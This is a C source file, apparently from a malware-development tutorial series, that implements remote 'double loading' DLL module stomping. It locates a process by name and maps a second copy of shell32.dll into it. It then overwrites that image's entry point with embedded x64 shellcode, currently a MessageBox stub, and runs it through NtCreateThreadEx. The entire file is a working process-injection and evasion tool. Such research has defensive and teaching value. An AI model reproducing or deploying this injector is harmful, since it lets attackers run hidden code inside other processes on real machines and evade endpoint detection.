/* 
 * hack2.c - remote Double Loading DLL & module stomping
 * technique: manual mapping of a system DLL into a REMOTE process
 * author: @cocomelonc
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

// shell32.dll - good candidate: big .text section
#define TARGET_DLL  L"C:\\Windows\\System32\\shell32.dll"

#define STATUS_SUCCESS  0x00000000
#define NT_SUCCESS(STATUS)  (((NTSTATUS)(STATUS)) >= STATUS_SUCCESS)

typedef enum _SECTION_INHERIT {
  ViewShare = 1,
  ViewUnmap = 2
} SECTION_INHERIT, * PSECTION_INHERIT;

// structures for Native API
typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
  ULONG Length;
  HANDLE RootDirectory;
  PUNICODE_STRING ObjectName;
  ULONG Attributes;
  PVOID SecurityDescriptor;
  PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _PS_ATTRIBUTE {
  ULONG_PTR Attribute;
  SIZE_T Size;
  union {
    ULONG_PTR Value;
    PVOID ValuePtr;
  };
  PSIZE_T ReturnLength;
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST {
  SIZE_T TotalLength;
  PS_ATTRIBUTE Attributes[3];
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

typedef NTSTATUS(NTAPI* fnNtCreateSection)(
  OUT PHANDLE  SectionHandle,
  IN  ACCESS_MASK  DesiredAccess,
  IN  POBJECT_ATTRIBUTES  ObjectAttributes  OPTIONAL,
  IN  PLARGE_INTEGER  MaximumSize  OPTIONAL,
  IN  ULONG  SectionPageProtection,
  IN  ULONG  AllocationAttributes,
  IN  HANDLE  FileHandle  OPTIONAL
  );

typedef NTSTATUS(NTAPI* fnNtMapViewOfSection)(
  IN  HANDLE  SectionHandle,
  IN  HANDLE  ProcessHandle,
  IN OUT  PVOID* BaseAddress,
  IN  SIZE_T  ZeroBits,
  IN  SIZE_T  CommitSize,
  IN OUT  PLARGE_INTEGER  SectionOffset  OPTIONAL,
  IN OUT  PSIZE_T  ViewSize,
  IN  SECTION_INHERIT InheritDisposition,
  IN  ULONG  AllocationType,
  IN  ULONG  Protect
  );

typedef NTSTATUS(NTAPI* fnNtCreateThreadEx)(
  PHANDLE     ThreadHandle,
  ACCESS_MASK     DesiredAccess,
  POBJECT_ATTRIBUTES  ObjectAttributes,
  HANDLE      ProcessHandle,
  PVOID       StartRoutine,
  PVOID       Argument,
  ULONG       CreateFlags,
  SIZE_T      ZeroBits,
  SIZE_T      StackSize,
  SIZE_T      MaximumStackSize,
  PPS_ATTRIBUTE_LIST  AttributeList
);

// find process ID by process name
int findMyProc(const char *procname) {

  HANDLE hSnapshot;
  PROCESSENTRY32 pe;
  int pid = 0;
  BOOL hResult;

  // snapshot of all processes in the system
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

  // initializing size: needed for using Process32First
  pe.dwSize = sizeof(PROCESSENTRY32);

  // info about first process encountered in a system snapshot
  hResult = Process32First(hSnapshot, &pe);

  // retrieve information about the processes
  // and exit if unsuccessful
  while (hResult) {
    // if we find the process: return process ID
    if (strcmp(procname, pe.szExeFile) == 0) {
      pid = pe.th32ProcessID;
      break;
    }
    hResult = Process32Next(hSnapshot, &pe);
  }

  // closes an open handle (CreateToolhelp32Snapshot)
  CloseHandle(hSnapshot);
  return pid;
}

// x64 shellcode (MessageBox "Hello world")
unsigned char rawData[] =
"\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

int main(int argc, char* argv[]) {
  if (argc < 2) {
    printf("usage: %s <process name>\n", argv[0]);
    return -1;
  }

  int pid = 0;
  NTSTATUS STATUS = 0;
  HANDLE hFile = INVALID_HANDLE_VALUE;
  HANDLE hSection = NULL;
  HANDLE hThread = NULL;
  HANDLE hProcess = NULL;
  PVOID uMappedModuleRemote = NULL;
  SIZE_T sViewSize = 0;
  DWORD dwOldProtection = 0;

  pid = findMyProc(argv[1]);

  // get NT API function addresses
  HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
  fnNtCreateSection pNtCreateSection = (fnNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
  fnNtMapViewOfSection pNtMapViewOfSection = (fnNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
  fnNtCreateThreadEx pNtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

  // open remote process
  hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
  if (!hProcess) {
    printf("OpenProcess failed: %d\n", GetLastError());
    return -1;
  }

  // open file from disk
  hFile = CreateFileW(TARGET_DLL, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (hFile == INVALID_HANDLE_VALUE) {
    printf("CreateFileW failed: %d\n", GetLastError());
    return -1;
  }

  // create SEC_IMAGE section locally
  STATUS = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);
  CloseHandle(hFile);
  if (!NT_SUCCESS(STATUS)) {
    printf("NtCreateSection failed: 0x%0.8X\n", STATUS);
    return -1;
  }

  // map the section into the REMOTE process
  // BaseAddress (uMappedModuleRemote) will be updated with the address in the REMOTE process
  STATUS = pNtMapViewOfSection(hSection, hProcess, &uMappedModuleRemote, 0, 0, NULL, &sViewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);
  if (!NT_SUCCESS(STATUS)) {
    printf("NtMapViewOfSection failed: 0x%0.8X\n", STATUS);
    CloseHandle(hSection);
    return -1;
  }

  printf("successfully mapped second instance of Shell32.dll into PID %d at 0x%p\n", pid, uMappedModuleRemote);

  // calculate the Entry Point offset locally
  // we map it locally briefly just to read the headers, or parse the file.
  // simpler: Use NtMapViewOfSection on current process to find the offset.
  PVOID uMappedModuleLocal = NULL;
  SIZE_T sLocalViewSize = 0;
  pNtMapViewOfSection(hSection, (HANDLE)-1, &uMappedModuleLocal, 0, 0, NULL, &sLocalViewSize, ViewShare, 0, PAGE_READONLY);
  
  PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)((ULONG_PTR)uMappedModuleLocal + ((PIMAGE_DOS_HEADER)uMappedModuleLocal)->e_lfanew);
  DWORD dwEntryPointOffset = pImgNtHdrs->OptionalHeader.AddressOfEntryPoint;
  UnmapViewOfFile(uMappedModuleLocal);

  ULONG_PTR uRemoteEntryPoint = (ULONG_PTR)uMappedModuleRemote + dwEntryPointOffset;
  printf("target remote entry point: 0x%p\n", (PVOID)uRemoteEntryPoint);

  // stomping: Write shellcode to the remote entry point
  if (!VirtualProtectEx(hProcess, (LPVOID)uRemoteEntryPoint, sizeof(rawData), PAGE_READWRITE, &dwOldProtection)) {
    printf("VirtualProtectEx (RW) failed: %d\n", GetLastError());
    goto _CLEANUP;
  }

  if (!WriteProcessMemory(hProcess, (LPVOID)uRemoteEntryPoint, rawData, sizeof(rawData), NULL)) {
    printf("WriteProcessMemory failed: %d\n", GetLastError());
    goto _CLEANUP;
  }

  if (!VirtualProtectEx(hProcess, (LPVOID)uRemoteEntryPoint, sizeof(rawData), dwOldProtection, &dwOldProtection)) {
    printf("VirtualProtectEx (restore) failed: %d\n", GetLastError());
    goto _CLEANUP;
  }

  // execution in remote process
  printf("press <Enter> to execute shellcode in remote process via NtCreateThreadEx...");
  getchar();

  STATUS = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (PVOID)uRemoteEntryPoint, NULL, FALSE, 0, 0, 0, NULL);
  if (!NT_SUCCESS(STATUS)) {
    printf("NtCreateThreadEx failed: 0x%0.8X\n", STATUS);
    goto _CLEANUP;
  }

  printf("executed thread %d in remote process!\n", GetThreadId(hThread));
  CloseHandle(hThread);

_CLEANUP:
  if (hSection) CloseHandle(hSection);
  if (hProcess) CloseHandle(hProcess);
  return 0;
}